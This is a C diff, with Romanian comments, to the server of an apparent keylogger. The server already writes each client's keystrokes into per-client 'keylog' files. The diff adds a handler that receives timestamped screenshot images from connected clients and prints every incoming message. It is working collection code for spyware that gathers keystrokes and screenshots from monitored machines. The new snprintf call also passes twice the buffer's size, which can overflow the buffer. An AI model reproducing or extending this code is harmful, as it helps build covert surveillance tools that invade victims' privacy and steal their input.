@@ -10,12 +10,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <fcntl.h>
+#include <time.h>
 
 extern clientHandler_t clientHndler;
 
 void handleOpcode(message_t msg, int clientSock)
 {
-
+    char filename[BUFFER_SIZE];
     switch (msg.opCode)
     {
         case 'K':
@@ -32,13 +33,22 @@ void handleOpcode(message_t msg, int clientSock)
 
         case 'U':
             strcpy(clientHndler.clientsAttr[clientSock].name, msg.buffer);
-            char filename[BUFFER_SIZE];
             snprintf(filename, sizeof(filename), "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);
 
             clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
             if (clientHndler.clientsAttr[clientSock].keylogger_fd == -1) {
                 perror("Eroare la deschiderea fișierului de Keylog");
             }
+        break;
+
+        case 'S':
+            time_t now = time(NULL);
+            struct tm *t = localtime(&now);
+            char timestamp[64];
+            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d_%H:%M", t);
+
+            snprintf(filename, BUFFER_SIZE * 2, "%s_%s.jpg", clientHndler.clientsAttr[clientSock].name, timestamp);
+            recvFile(clientSock, filename);
         break;
     default:
         fflush(NULL);
@@ -57,7 +67,8 @@ void* handle_client(void* params) {
     // Primesc date de la client
     while ((read_size = recv(args->client_sock, &client_message, sizeof(client_message), 0)) > 0) {
         client_message.buffer[client_message.size] = '\0';
-        //printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
+        printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
+        fflush(0);
         handleOpcode(client_message, args->client_sock);
 
     }
